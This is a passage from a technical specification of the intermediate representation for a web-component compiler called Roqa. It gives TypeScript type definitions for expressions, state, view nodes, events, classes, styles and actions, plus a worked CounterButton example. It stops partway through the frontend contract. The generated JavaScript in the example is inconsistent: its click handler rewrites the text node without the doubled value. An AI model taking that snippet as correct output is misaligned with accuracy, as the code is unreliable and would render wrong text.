# Roqa Intermediate Representation (IR)

This document defines the intermediate representation (IR) that sits between
Roqa's authoring frontends and its code generation backend. The IR is the
central data structure of the compiler — every component must pass through it,
regardless of which frontend syntax was used to author it.

## What is an IR and why does it matter?

An intermediate representation is a structured data format that a compiler uses
internally to represent a program between parsing and code generation. Instead
of going directly from source code to output, the compiler goes:

```txt
source → IR → output
```

This indirection exists because source code is optimized for humans (or agents)
to write and output code is optimized for machines to execute — but neither is
a good format for the compiler to analyze and transform. The IR is the format
optimized for the compiler itself.

### Mental model: IR as a blueprint

Think of it like architecture. A person writes a description of a building (the
component source). The IR is the blueprint — a precise structural drawing that
strips away prose and captures exactly what needs to be built. The code
generator is the construction crew that reads the blueprint and builds the
actual structure.

The blueprint doesn't contain opinions about *how* to write the description or
*how* to pour the concrete. It captures *what* exists: which rooms, which
walls, which doors, where the plumbing goes.

### Properties of a good IR

**1. Complete** — the IR must contain everything the code generator needs. If
information is lost in the translation from source to IR, the code generator
can't recover it. For Roqa, this means the IR must capture: the full view tree
structure, which values are reactive, which are static, all event bindings, all
state with initial values, all computed dependencies, all expressions.

**2. Unambiguous** — every IR node has exactly one interpretation. A `kind`
field on every node means you can always pattern-match on it. There are no
cases where the code generator has to guess what something means.

**3. Minimal** — the IR shouldn't carry information that no downstream phase
uses. For example, TypeScript types are useful for diagnostics but the code
generator doesn't need them for output — so they're optional metadata, not
required structure.

**4. Normalized** — different ways of writing the same thing in source code
should produce the same IR. The class `"button"` and `["button"]` both produce
the same `ClassIR`. This means the code generator only handles one form.

**5. Frontend-independent** — the IR doesn't know whether it came from JSX,
a custom DSL, a GUI web builder, or any other authoring tool. Any frontend
that can produce valid IR can use the same backend. This is what makes the
multi-frontend architecture possible:

```txt
JSX frontend             \
Custom DSL frontend       \
GUI web builder            \
AI-built authoring tools    → Roqa IR → Backend codegen → Optimized JS
Other programming langs    /
```

### How to read IR type definitions

The IR is defined as TypeScript types using discriminated unions. If you're not
used to these, here's the pattern:

```ts
type NodeIR =
    | ElementIR
    | TextIR
    | ShowIR;
```

This means: "a `NodeIR` is one of `ElementIR`, `TextIR`, or `ShowIR`." Each
variant has a `kind` field that tells you which one it is:

```ts
type ElementIR = { kind: "element"; tag: string; ... };
type TextIR    = { kind: "text"; value: string; };
type ShowIR    = { kind: "show"; condition: ...; ... };
```

To process an IR node, you switch on `kind`:

```ts
function processNode(node: NodeIR) {
    switch (node.kind) {
        case "element": return processElement(node);
        case "text":    return processText(node);
        case "show":    return processShow(node);
    }
}
```

This pattern is sometimes called a "tagged union" — the `kind` field is the
tag. It's the standard way to represent tree-structured data in compilers.

### Two kinds of IR fields

IR nodes carry two kinds of information:

- **Structural fields** describe *what* to build. The `tag` on an `ElementIR`,
  the `children` array, the `condition` on a `ShowIR`. These drive code
  generation.

- **Metadata fields** provide extra context for validation, diagnostics, or
  tooling. Type annotations, source positions, debug labels. These are optional
  and don't affect the generated output.

The distinction matters when evolving the IR: structural fields are hard to
change (everything downstream depends on them), metadata fields are easy to add.

### Static vs reactive: the core distinction

The most important concept in this IR is the difference between **static** and
**reactive** values.

A **static value** is known at build time and baked into the HTML template:

```ts
{ kind: "literal", value: "increment-button" }  // becomes id="increment-button" in template
{ kind: "text", value: "Count is " }             // becomes literal text in template
```

A **reactive value** is a reference to state that can change at runtime:

```ts
{ kind: "state-read", name: "count" }  // becomes a binding that updates when count changes
{ kind: "cell-ref", name: "todos" }    // becomes a cell subscription
```

The code generator treats these fundamentally differently:
- Static values (`LiteralExpr`) go into `template("<html>")` strings
- Reactive values become cell declarations, binding setup, text node
  `nodeValue` updates, etc.

A **cell-ref** vs a **state-read** matters too:
- `cell-ref` = "give me the cell itself" — used by `showBlock()`,
  `forBlock()` for subscription
- `state-read` = "give me the current value" — used in text content,
  attribute bindings, class conditions

---

## The 3-Tier IR Architecture

Roqa uses a three-level IR pipeline. This is the same pattern used by
production compilers like LLVM (where C/Rust/Swift each have their own AST, but
all compile to LLVM IR, which is then lowered to machine-specific instructions).

```txt
┌─────────────────────────────────────────────────────────────────────┐
│  HIGH-LEVEL IR (HIR)                                                │
│  ─────────────────                                                  │
│  One per authoring syntax. Captures intent in that syntax's terms.  │
│  May contain sugar, shorthands, and syntax-specific concepts.       │
│  "Loose" — multiple representations for the same concept are OK.    │
│                                                                     │
│  Examples:                                                          │
│  - JSX HIR: JSX element nodes, expression containers, fragments     │
│  - DSL HIR: domain-specific shorthand nodes, macro expansions       │
│  - GUI builder HIR: drag-drop layout nodes, visual property panels  │
│                                                                     │
│  Each frontend is responsible for defining its own HIR and for      │
│  normalizing it into valid MIR.                                     │
└──────────────────────────┬──────────────────────────────────────────┘
                           │ normalize(hir) → mir
                           ▼
┌─────────────────────────────────────────────────────────────────────┐
│  MID-LEVEL IR (MIR) — THE CANONICAL IR                              │
│  ────────────────────────────────────                               │
│  THE contract between frontends and the backend.                    │
│  Frontend-independent. Fully normalized. JSON-serializable.         │
│  One representation for each concept — no sugar.                    │
│  If it exists, it's structurally valid.                             │
│                                                                     │
│  This document primarily specifies the MIR.                         │
└──────────────────────────┬──────────────────────────────────────────┘
                           │ lower(mir) → lir
                           ▼
┌─────────────────────────────────────────────────────────────────────┐
│  LOW-LEVEL IR (LIR)                                                 │
│  ─────────────────                                                  │
│  Directly maps to code generation operations.                       │
│  High-level constructs decomposed into primitive ops.               │
│  Template strings computed, traversal paths resolved,               │
│  binding graphs materialized.                                       │
│  Optimization passes operate at this level.                         │
│  Not intended to be human-authored.                                 │
│                                                                     │
│  Specified in compiler.md.                                          │
└─────────────────────────────────────────────────────────────────────┘
```

### Why three levels? (plain-speak)

Think of it like language translation.

The **HIR** is like the original text in French — it uses French idioms and
grammar. A Spanish frontend would produce Spanish text with Spanish idioms.
Each language (frontend) has its own way of saying things.

The **MIR** is like a language-neutral "meaning representation" — it captures
*what* is being said, not *how* any particular language says it. This is the
universal format that all frontends must produce and the backend consumes.

The **LIR** is like detailed typesetting instructions for a printing press —
it tells the machine exactly what to do: place this character here, start a new
line there, set this margin. Humans don't write typesetting instructions, but
the press needs them.

The MIR is the most important because it's the **contract**. Frontend authors
need to know: "if I produce this data structure, Roqa will generate correct,
fast code." Backend developers need to know: "I only need to handle these node
types in these configurations."

### What this document covers

This document specifies the **MIR** (canonical IR) in full detail — it's the
contract that matters most. The HIR is intentionally unspecified (each frontend
defines its own). The LIR is specified in [compiler.md](./compiler.md) as part
of the code generation pipeline.

---

## MIR: Component IR

The root type. One per component definition.

```ts
type ComponentIR = {
    version: 1;                   // IR format version — increment on breaking changes
    tagName: string;              // Custom element tag (e.g., "counter-button")
    name: string;                 // Export/identifier name (e.g., "CounterButton")

    state: StateIR[];
    actions: ActionIR[];
    props: PropIR[];
    attrs: AttrIR[];
    emits: EmitIR[];
    lifecycle: LifecycleIR;
    render: NodeIR[];             // The root children of the view tree

    metadata?: ComponentMetadata; // Optional non-structural information
};

type ComponentMetadata = {
    sourceFile?: string;          // Original source file path
    frontend?: string;            // Which frontend produced this IR (e.g., "jsx", "builder")
    imports?: ImportIR[];         // External dependencies
};
```

Every section is an array (or object for lifecycle) so the code generator can
iterate uniformly. Empty sections are empty arrays, not absent keys — this
simplifies iteration.

The `render` field is an array of `NodeIR` children (the root-level nodes).
When a component has a single root element, this is a one-element array. When
it has multiple root elements (a fragment), it's a multi-element array.

The `version` field is critical for the multi-frontend architecture. When the
MIR format changes, frontends with outdated output are caught immediately with
a clear error message rather than producing subtly wrong code.

---

## MIR: Expression IR

Expressions are used in action bodies, computed values, lifecycle hooks, and
inline event handlers. The expression IR is a small structured language for
representing computations — it replaces raw source text strings, making the IR
truly frontend-independent.

### Why a structured expression IR? (plain-speak)

Think of a calculator app. The expression `2 + 3` means the same thing whether
you type it in English, write it in Python, or draw it in a visual node editor.
The expression IR is like that — a universal notation for UI state operations
that any frontend can produce, regardless of whether the frontend uses
JavaScript, a custom DSL, or a visual builder.

Without this, every frontend would be forced to generate JavaScript source
strings, which defeats the purpose of having a frontend-independent IR.

### Expression types

```ts
type ExprIR =
    | LiteralExpr
    | TemplateLiteralExpr
    | ObjectExpr
    | StateReadExpr
    | StateWriteExpr
    | PropReadExpr
    | AttrReadExpr
    | ComputedReadExpr
    | ParamReadExpr
    | BinaryExpr
    | UnaryExpr
    | ConditionalExpr
    | MemberExpr
    | IndexExpr
    | SpreadExpr
    | CallExpr
    | MethodCallExpr
    | BlockExpr
    | CollectionOpExpr
    | EmitExpr
    | ActionCallExpr
    | ItemFieldReadExpr
    | ClosureExpr
    | ImportedRefExpr
    | ExternalRefExpr
    | OpaqueExpr;
```

### Value expressions

```ts
// A concrete value known at build time
type LiteralExpr = {
    kind: "literal";
    value: string | number | boolean | null;
};

// Template literal with interpolated expressions
// Exists in the MIR for semantic clarity — frontends can express string
// interpolation naturally. The backend lowers this to binary "+"
// concatenation during codegen, since benchmarking shows concatenation
// is consistently faster than template literals in hot paths.
type TemplateLiteralExpr = {
    kind: "template-literal";
    parts: (string | ExprIR)[];   // Alternating static strings and expressions
                                  // e.g., ["Hello ", <expr>, "!"] for `Hello ${name}!`
};

// Construct a plain object literal: { key: value, ...spread }
// Common in UI logic for creating new items, building payloads, merging objects.
type ObjectExpr = {
    kind: "object";
    properties: ObjectPropertyIR[];
};

type ObjectPropertyIR =
    | { kind: "property"; key: string; value: ExprIR }
    | { kind: "spread"; argument: ExprIR };

// Read the current value of a state cell
type StateReadExpr = {
    kind: "state-read";
    name: string;                 // Name of the state property
};

// Write a new value to a state cell (triggers reactive updates)
type StateWriteExpr = {
    kind: "state-write";
    name: string;                 // Name of the state property
    value: ExprIR;                // The new value expression
};

// Read a prop value
type PropReadExpr = {
    kind: "prop-read";
    name: string;
    path?: string[];              // For nested access: ["url"] for props.story.url
};

// Read an attribute value
type AttrReadExpr = {
    kind: "attr-read";
    name: string;
};

// Read a computed value
type ComputedReadExpr = {
    kind: "computed-read";
    name: string;
};

// Read a parameter by name (action params, closure params, event param)
// Replaces opaque source strings like "id", "t", "e.target.value".
// The name must match a parameter declared in the enclosing ActionIR.params
// or ClosureExpr.params. For inline event handlers, the implicit event
// parameter is always named "e".
type ParamReadExpr = {
    kind: "param-read";
    name: string;                 // Parameter name: "id", "t", "e", etc.
};

// Read a field of the current list item (inside each() render callbacks)
type ItemFieldReadExpr = {
    kind: "item-field-read";
    field: string;
};
```

### Operator expressions

```ts
// Binary operations: arithmetic, comparison, logical
type BinaryExpr = {
    kind: "binary";
    op: "+" | "-" | "*" | "/" | "%" |
        "===" | "!==" | ">" | "<" | ">=" | "<=" |
        "&&" | "||" | "??" ;
    left: ExprIR;
    right: ExprIR;
};

// Unary operations: negation, logical not
type UnaryExpr = {
    kind: "unary";
    op: "!" | "-" | "typeof";
    operand: ExprIR;
};

// Ternary conditional: condition ? consequent : alternate
type ConditionalExpr = {
    kind: "conditional";
    test: ExprIR;
    consequent: ExprIR;
    alternate: ExprIR;
};
```

### Access expressions

```ts
// Property access: expr.property
type MemberExpr = {
    kind: "member";
    object: ExprIR;
    property: string;
};

// Computed property access: expr[index]
type IndexExpr = {
    kind: "index";
    object: ExprIR;
    index: ExprIR;
};

// Spread an iterable into an array or object context
// Used in collection operations, function calls, and array/object construction.
// e.g., [...existingItems, newItem] or fn(...args)
type SpreadExpr = {
    kind: "spread";
    argument: ExprIR;
};
```

### Call expressions

```ts
// Function call: fn(args)
type CallExpr = {
    kind: "call";
    callee: ExprIR;
    args: ExprIR[];
};

// Method call: obj.method(args)
// Separate from CallExpr because it's very common and avoids
// nested MemberExpr + CallExpr for the typical case
type MethodCallExpr = {
    kind: "method-call";
    object: ExprIR;
    method: string;
    args: ExprIR[];
};
```

### Statement and control flow expressions

```ts
// A sequence of expressions (evaluated in order, last value is the result)
type BlockExpr = {
    kind: "block";
    body: ExprIR[];
};

// A closure / callback function
type ClosureExpr = {
    kind: "closure";
    params: ClosureParam[];
    body: ExprIR;
};

// Closure parameters support both simple names and destructuring patterns.
// Destructuring is common in array methods (e.g., .map(({ id, name }) => ...))
// and event handlers.
type ClosureParam =
    | string                      // Simple parameter: "item"
    | DestructuredParam;          // Destructured: "{ id, name }" or "[ first, ...rest ]"

type DestructuredParam = {
    kind: "destructured";
    pattern: "object" | "array";
    bindings: DestructuredBinding[];
    rest?: string;                // Rest element name: "...rest" → "rest"
};

type DestructuredBinding = {
    key: string;                  // Property name (object) or index position (array)
    alias?: string;               // Rename: { id: todoId } → key="id", alias="todoId"
    default?: ExprIR;             // Default value: { count = 0 }
};
```

### Domain-specific expressions

```ts
// Collection operations: insert, remove, filter, etc.
type CollectionOpExpr = {
    kind: "collection-op";
    op: "insert" | "remove" | "update" | "remove-where" | "move" | "clear";
    name: string;                 // Name of the state collection
    args: ExprIR[];               // Operation-specific arguments
};

// Dispatch a custom event
type EmitExpr = {
    kind: "emit";
    event: string;                // Event name (e.g., "todo-added")
    detail?: ExprIR;              // Optional event detail payload
};

// Call a sibling action by name
type ActionCallExpr = {
    kind: "action-call";
    name: string;
    args: ExprIR[];
};
```

### External and imported references

Real-world components frequently reference values outside their own state,
props, and actions — utility functions, constants, math operations, third-party
libraries, etc. These nodes make external references explicit in the expression
tree so the backend can track dependencies and generate correct imports.

```ts
// Reference to a value imported from another module
// e.g., import { formatDate } from "./utils.js" → use formatDate(timestamp)
type ImportedRefExpr = {
    kind: "imported-ref";
    source: string;               // Module specifier: "./utils.js", "lodash/debounce"
    name: string;                 // Imported binding name: "formatDate"
    isDefault?: boolean;          // true for default imports
};

// Reference to a global or built-in value
// e.g., Math.floor, console.log, parseInt, JSON.stringify
type ExternalRefExpr = {
    kind: "external-ref";
    name: string;                 // Top-level name: "Math", "console", "parseInt"
    path?: string[];              // Property path: ["floor"] for Math.floor
};
```

These are preferable to `OpaqueExpr` because the backend can:
- Verify that imported modules exist (during validation)
- Deduplicate imports when multiple components use the same utility
- Track which externals a component depends on (for tree-shaking, bundling)
- Generate correct import statements in the output

For example, `Math.floor(value * 100)` is represented as:

```json
{
    "kind": "call",
    "callee": {
        "kind": "external-ref",
        "name": "Math",
        "path": ["floor"]
    },
    "args": [{
        "kind": "binary",
        "op": "*",
        "left": { "kind": "state-read", "name": "value" },
        "right": { "kind": "literal", "value": 100 }
    }]
}
```

### The escape hatch

For cases that don't fit the structured expression types — external library
calls, complex algorithms, etc. — the `OpaqueExpr` provides a raw-source
escape hatch. This should be used sparingly; the more opaque expressions in an
IR, the less the backend can optimize.

```ts
type OpaqueExpr = {
    kind: "opaque";
    source: string;               // Raw JavaScript source text
    reads: string[];              // State cells read (must be manually declared)
    writes: string[];             // State cells written (must be manually declared)
};
```

Because the backend can't analyze opaque source, the `reads` and `writes`
arrays must be explicitly declared so the backend knows which cells to
subscribe to and which bindings to trigger. If these are wrong, reactivity will
be broken — so frontends should prefer structured expressions whenever
possible.

### Expression IR example

Here's how a simple action body looks in structured expression form:

```
// The action: "increment count by 1"
// JS equivalent: state.count.set(state.count.get() + 1)

{
    "kind": "state-write",
    "name": "count",
    "value": {
        "kind": "binary",
        "op": "+",
        "left": { "kind": "state-read", "name": "count" },
        "right": { "kind": "literal", "value": 1 }
    }
}
```

And a computed value:

```
// The computed: "count of incomplete todos"
// JS equivalent: state.todos.get().filter(t => !t.completed).length

{
    "kind": "member",
    "object": {
        "kind": "method-call",
        "object": { "kind": "state-read", "name": "todos" },
        "method": "filter",
        "args": [{
            "kind": "closure",
            "params": ["t"],
            "body": {
                "kind": "unary",
                "op": "!",
                "operand": {
                    "kind": "member",
                    "object": { "kind": "param-read", "name": "t" },
                    "property": "completed"
                }
            }
        }]
    },
    "property": "length"
}
```

Note: The structured form is more verbose than raw JS text, but it's
unambiguous, serializable, and analyzable by the compiler. The backend can walk
the expression tree to automatically derive dependencies (which cells are read)
rather than relying on manual declaration.

---

## MIR: State IR

State declarations describe the reactive data the component owns.

```ts
type StateIR =
    | StateValueIR
    | StateCollectionIR
    | StateComputedIR;
```

### `StateValueIR` — simple reactive value

```ts
type StateValueIR = {
    kind: "value";
    name: string;                 // The state property name
    initial: unknown;             // The initial value (number, string, boolean, array, etc.)
    hints?: OptimizationHints;
};
```

Backend output:

```ts
const count = cell(0);
// After inlining: const count = { v: 0, e: [] };
```

### `StateCollectionIR` — keyed list

```ts
type StateCollectionIR = {
    kind: "collection";
    name: string;
    key: string | null;           // String = key property name, null = identity
    initial: unknown[];           // Initial array contents
    hints?: OptimizationHints;
};
```

Backend output:

```ts
const todos = cell([]);
// Collection helpers (insert, remove, etc.) are inlined at action call sites
```

### `StateComputedIR` — derived value

```ts
type StateComputedIR = {
    kind: "computed";
    name: string;
    body: ExprIR;                 // The computation as a structured expression
    hints?: OptimizationHints;
};
```

The backend derives dependencies automatically by walking the `body` expression
tree and collecting all `state-read` nodes. No manual `dependencies` array is
needed — the expression structure is the source of truth.

Backend output:

```ts
const remaining = cell(() => get(todos).filter(t => !t.completed).length);
// After inlining: const remaining = { v: () => todos.v.filter(...), e: [] };
```

### `OptimizationHints` — frontend-provided optimization metadata

Frontends may have information about state usage patterns that the backend
can't infer from the MIR alone. Optimization hints are strictly advisory — the
backend must produce correct code even if hints are absent or wrong, but
correct hints enable better optimization.

```ts
type OptimizationHints = {
    writeOnce?: boolean;          // State is set once and never updated again
                                  // Backend can skip reactive binding setup
    maxItems?: number;            // Collection will never exceed this size
                                  // Backend can use simpler reconciliation
    pureComputed?: boolean;       // Computed has no side effects
                                  // Backend can memoize or skip re-evaluation
    hotPath?: boolean;            // This state updates very frequently (e.g., animation)
                                  // Backend should optimize update path aggressively
    immutable?: boolean;          // Value is never mutated (only replaced)
                                  // Backend can use reference equality checks
};
```

Hints are optional on `StateValueIR`, `StateCollectionIR`, and
`StateComputedIR`. They don't affect correctness — only performance. A
frontend that doesn't know or care about optimization can omit them entirely.

---

## MIR: Node IR

The view tree. Every node the component renders is one of these types.

```ts
type NodeIR =
    | ElementIR
    | TextIR
    | ReactiveTextIR
    | ShowIR
    | EachIR;
```

### `ElementIR` — an HTML element

The most common node type. Represents a single DOM element with its attributes,
events, children, etc.

```ts
type ElementIR = {
    kind: "element";
    tag: string;                  // HTML tag name (e.g., "div", "button")
    ref?: string;                 // Named ref for lifecycle access
    attributes: Record<string, ExprIR>;
    events: EventBindingIR[];
    children: NodeIR[];
    classes?: ClassIR;
    styles?: StyleIR;
};
```

Attribute values are `ExprIR` nodes. Static attributes use `LiteralExpr`,
reactive attributes use `StateReadExpr`, `PropReadExpr`, `ComputedReadExpr`,
or any other expression. This means attributes can hold computed expressions
(e.g., `data-total={count + 1}` → a `BinaryExpr`) without falling back to
`OpaqueExpr`.

The code generator splits this into:
- **Template**: the tag + static attributes (those with `LiteralExpr` values) → HTML string
- **Traversal**: firstChild/nextSibling chains to reach dynamic points
- **Bindings**: non-literal attribute expressions → binding setup
- **Events**: event bindings → `element.__click = handler` assignments

**`class` attribute vs `classes` field:** These are mutually exclusive. When a
component needs conditional classes, use the `classes` field with `ClassListIR`.
When all classes are static, use either `classes` with `StaticClassIR` or put
`class` in `attributes` as a `LiteralExpr` — both are valid and produce the
same output. Frontends must not set both `attributes.class` and `classes` on
the same element — validation will reject this as ambiguous.

The distinction matters for code generation: if `classes` is present and contains
any conditional items (`ClassListIR`), the template HTML omits the `class`
attribute entirely and the full `className` is set via a runtime binding. If
`classes` is absent and `attributes.class` is a `LiteralExpr`, the class goes
directly into the template HTML string.

### `TextIR` — static text

```ts
type TextIR = {
    kind: "text";
    value: string;
};
```

Goes directly into the template HTML string. No binding needed.

### `ReactiveTextIR` — dynamic text value

```ts
type ReactiveTextIR = {
    kind: "reactive-text";
    source: ExprIR;               // Expression to display (typically StateReadExpr,
                                  // ComputedReadExpr, PropReadExpr, or ItemFieldReadExpr)
};
```

A space placeholder `' '` goes into the template (creating a text node), and a
binding updates `textNode.nodeValue` when the source changes.

When multiple `ReactiveTextIR` nodes and `TextIR` nodes appear as adjacent
siblings in the same element, they share a **single text node** in the
template (one space placeholder). The binding concatenates all parts into one
`nodeValue` update. This matches the existing Roqa compiler behavior and
avoids creating unnecessary DOM text nodes:

```
// MIR children:
[
    { "kind": "text", "value": "Count: " },
    { "kind": "reactive-text", "source": { "kind": "state-read", "name": "count" } },
    { "kind": "text", "value": " / Doubled: " },
    { "kind": "reactive-text", "source": { "kind": "computed-read", "name": "doubled" } }
]

// Template: '<p> </p>'  (single space = single text node)
// Binding: p_1_text.nodeValue = "Count: " + count.v + " / Doubled: " + count.v * 2;
```

Note: `ReactiveTextIR` has its own `kind: "reactive-text"` distinct from the
expression nodes it contains. A `ReactiveTextIR` is a node in the view tree
(it tells the code generator "create a text node here"). The `ExprIR` inside
its `source` tells the code generator what value to display and which cells
to subscribe to.

### `ShowIR` — conditional rendering

```ts
type ShowIR = {
    kind: "show";
    condition: CellRef;           // Cell to subscribe to
    render: NodeIR[];             // View tree when truthy
    fallback?: NodeIR[];          // Optional view tree when falsy
};
```

Lowered to `showBlock(container, conditionCell, renderFn)`.

The `condition` is a **cell-ref** (not an expression read) — the code generator
passes the cell directly to `showBlock()` for subscription.

### `EachIR` — list rendering

```ts
type EachIR = {
    kind: "each";
    source: CellRef;              // Cell containing the array
    key?: string | null;          // Key field name or null for identity
    itemAlias: string;            // Variable name for the current item (e.g., "todo")
    render: NodeIR[];             // View tree for each item
};
```

Lowered to `forBlock(container, sourceCell, renderFn)`.

The `itemAlias` names the iteration variable in the generated `forBlock` render
callback. The backend derives which item fields are accessed by walking the
render tree for `item-field-read` expression nodes.

---

## MIR: CellRef

The only remaining ref type. This exists because it expresses a fundamentally
different operation from reading a value — it means "give me the cell object
itself" for subscription, not "give me the current value."

```ts
type CellRef = {
    kind: "cell-ref";
    name: string;
};
```

Used by `ShowIR` and `EachIR` to pass the cell directly to `showBlock()` and
`forBlock()` for subscription. The `name` can reference any state-kind entry
(value, collection, or computed) — all become cells at runtime.

Distinct from `StateReadExpr` (`kind: "state-read"`) — a `CellRef` says "I
need the cell object itself" while a `StateReadExpr` says "I need the current
value (`.v`)."

---

## MIR: Event binding IR

```ts
type EventBindingIR = {
    event: string;                // DOM event name: "click", "input", etc.
    handler: ExprIR;              // Handler expression — typically one of:
                                  //   ActionCallExpr   → named action reference
                                  //   ClosureExpr      → inline handler with body
                                  //   CallExpr         → bound action with args
};
```

Event handlers are `ExprIR` nodes. The most common forms:

- **Named action** — `{ kind: "action-call", name: "increment", args: [] }`.
  Lowers to `el.__click = increment`.
- **Bound action** — `{ kind: "action-call", name: "toggleTodo", args: [{ kind: "item-field-read", field: "id" }] }`.
  Lowers to `el.__click = [toggleTodo, id]` (array-form delegated event).
- **Inline handler** — `{ kind: "closure", params: ["e"], body: <ExprIR> }`.
  Lowers to `el.__input = (e) => { ... }`.

```ts
// REMOVED: ActionRef, BoundActionRef, and InlineHandlerIR are no longer
// separate types. They are expressed using standard ExprIR nodes:
//   ActionRef        → ActionCallExpr { name, args: [] }
//   BoundActionRef   → ActionCallExpr { name, args: [...] }
//   InlineHandlerIR  → ClosureExpr { params: ["e"], body: <ExprIR> }
```

---

## MIR: Class IR

Classes have their own IR because they support multiple authoring forms that
normalize to structured data.

```ts
type ClassIR =
    | StaticClassIR
    | ClassListIR;

type StaticClassIR = {
    kind: "static-class";
    value: string;                // e.g., "button primary"
};

type ClassListIR = {
    kind: "class-list";
    items: ClassItemIR[];
};

type ClassItemIR =
    | string                                          // Static class name
    | { name: string; condition: ExprIR };            // Conditional class
```

Normalization — all of these source forms produce the same MIR:

```
// All of these:
class="button"
class={["button"]}
class={{ button: true }}

// Normalize to:
{ "kind": "static-class", "value": "button" }
```

```
// This:
class={["todo", { completed: todo.completed }]}

// Normalizes to:
{
    "kind": "class-list",
    "items": [
        "todo",
        { "name": "completed", "condition": { "kind": "item-field-read", "field": "completed" } }
    ]
}
```

---

## MIR: Style IR

Inline styles have their own IR for normalization (camelCase vs kebab-case,
static vs reactive values).

```ts
type StyleIR =
    | StaticStyleIR
    | StyleMapIR;

type StaticStyleIR = {
    kind: "static-style";
    value: string;                // Pre-serialized CSS string (e.g., "color: red; font-size: 14px")
};

type StyleMapIR = {
    kind: "style-map";
    properties: StylePropertyIR[];
};

type StylePropertyIR = {
    property: string;             // CSS property name, always kebab-case (e.g., "font-size")
    value: ExprIR;                // LiteralExpr for static, StateReadExpr etc. for reactive
};
```

All style property names are normalized to kebab-case in the MIR, regardless of
how the frontend expressed them (camelCase `fontSize` or kebab-case
`font-size`). This ensures the code generator only handles one form.

---

## MIR: Action IR

```ts
type ActionIR = {
    kind: "action";
    name: string;                 // The action name
    params: string[];             // Parameter names (always simple strings)
    body: ExprIR;                 // Action logic as a structured expression
};
```

Action parameters are always simple `string[]` names — they don't support
destructuring patterns. Actions receive arguments from event handlers (e.g.,
an item id, a form value), which are simple values. When an action's body
needs destructuring internally (e.g., in a `.filter()` callback), that's
expressed via `ClosureExpr` with `DestructuredParam` in the body expression
tree.

Action bodies are structured expressions. The backend walks the expression tree
to determine which state cells are read and written, then generates the
appropriate reactive update code.

---

## MIR: Prop, Attr, Emit IR

### Props — rich JS values passed to custom elements

```ts
type PropIR = {
    kind: "prop";
    name: string;
    required: boolean;
    default?: unknown;
};
```

### Attrs — serialized DOM attributes

```ts
type AttrIR = {
    kind: "attr";
    name: string;
    default?: unknown;
    reflect: boolean;             // Whether changes are reflected back to the DOM attribute
};
```

### Emits — custom events the component dispatches

```ts
type EmitIR = {
    kind: "emit-decl";
    name: string;                 // Internal handle name (e.g., "todoAdded")
    eventName: string;            // DOM event name (e.g., "todo-added")
};
```

### Imports — external dependencies

```ts
type ImportIR = {
    kind: "import";
    source: string;               // Module specifier (e.g., "./utils.js")
    bindings: string[];           // Names imported (e.g., ["formatDate", "capitalize"])
};
```

---

## MIR: Lifecycle IR

```ts
type LifecycleIR = {
    onConnect?: ExprIR;           // Runs when the component is mounted
    onDisconnect?: ExprIR;        // Runs when the component is unmounted
};
```

Lifecycle hooks are structured expressions, just like action bodies. The code
generator compiles them the same way and places them inside
`this.connected()` / `this.disconnected()`.

---

## MIR: Complete example

Here is the full MIR for a simple CounterButton component.

### What the component does

A button that displays a count and a doubled value. Clicking the button
increments the count.

### MIR

```json
{
    "version": 1,
    "tagName": "counter-button",
    "name": "CounterButton",

    "props": [],
    "attrs": [],
    "emits": [],

    "state": [
        {
            "kind": "value",
            "name": "count",
            "initial": 0
        },
        {
            "kind": "computed",
            "name": "doubled",
            "body": {
                "kind": "binary",
                "op": "*",
                "left": { "kind": "state-read", "name": "count" },
                "right": { "kind": "literal", "value": 2 }
            }
        }
    ],

    "actions": [
        {
            "kind": "action",
            "name": "increment",
            "params": [],
            "body": {
                "kind": "state-write",
                "name": "count",
                "value": {
                    "kind": "binary",
                    "op": "+",
                    "left": { "kind": "state-read", "name": "count" },
                    "right": { "kind": "literal", "value": 1 }
                }
            }
        }
    ],

    "lifecycle": {},

    "render": [
        {
            "kind": "element",
            "tag": "button",
            "attributes": {
                "id": { "kind": "literal", "value": "increment-button" }
            },
            "events": [
                {
                    "event": "click",
                    "handler": { "kind": "action-call", "name": "increment", "args": [] }
                }
            ],
            "children": [
                { "kind": "text", "value": "Count is " },
                { "kind": "reactive-text", "source": { "kind": "state-read", "name": "count" } },
                { "kind": "text", "value": " / doubled is " },
                { "kind": "reactive-text", "source": { "kind": "computed-read", "name": "doubled" } }
            ]
        }
    ]
}
```

### What the backend does with this MIR

1. **Reads `state`** → emits `const count = cell(0)` and
   `const doubled = cell(() => get(count) * 2)` (computed body compiled from
   the expression tree)

2. **Reads `actions`** → compiles the expression tree and emits
   `const increment = () => { set(count, get(count) + 1); }`

3. **Walks `render`** → sees `kind: "element"`, `tag: "button"`:
   - Extracts static HTML: `<button id="increment-button"> </button>`
     (spaces are placeholders for reactive text nodes)
   - Generates traversal: `const button_1 = this.firstChild`
   - Generates text node ref: `const button_1_text = button_1.firstChild`

4. **Processes `events`** → sees `click` with `action-call` "increment":
   - Emits `button_1.__click = increment`
   - Records "click" for `delegate()` call

5. **Processes `children`** → sees two static text nodes and two reactive texts:
   - The reactive texts generate bindings that update `nodeValue`
   - Emits `bind(count, ...)` and `bind(doubled, ...)`

6. **Wraps everything** in `defineComponent("counter-button", function() { ... })`

7. **Optimization passes** inline all `cell()`, `get()`, `set()`, `bind()`
   calls into the final optimized output.

### Final output

```js
import { defineComponent, delegate, template } from "roqa";

const $tmpl_1 = template('<button id="increment-button"> </button>');

defineComponent("counter-button", function CounterButton() {
    const count = { v: 0, e: [] };
    const doubled = { v: () => count.v * 2, e: [] };

    this.connected(() => {
        const $root_1 = $tmpl_1();
        this.appendChild($root_1);

        const button_1 = this.firstChild;
        const button_1_text = button_1.firstChild;

        button_1.__click = () => {
            count.v = count.v + 1;
            count.ref_1.nodeValue = "Count is " + count.v;
        };

        button_1_text.nodeValue = "Count is " + count.v + " / doubled is " + count.v * 2;
        count.ref_1 = button_1_text;
    });
});

delegate(["click"]);
```

---

## Frontend contract

Any tool that wants to generate Roqa components must produce valid MIR. This
section specifies that contract.

### Requirements

1. **Produce a valid `ComponentIR`** — all required fields present, correct
   types, `version` set to the current MIR version.

2. **Normalize all sugar** — the MIR must be fully normalized. If your frontend
   has shorthand syntax (e.g., `class="foo"` vs `class={["foo"]}`), resolve it
   to the canonical MIR form before emitting.

3. **Use structured expressions** — action bodies, computed values, and
   lifecycle hooks should use `ExprIR` nodes. Fall back to `OpaqueExpr` only
   for logic that truly can't be expressed structurally. Every `OpaqueExpr`
   must have accurate `reads` and `writes` arrays.

4. **Declare all state, actions, props, attrs, and emits** — if the render tree
   references `state.count`, there must be a `StateIR` with `name: "count"`.
   Dangling references are validation errors.

5. **Use unique names** — no duplicate names within state, actions, props, attrs,
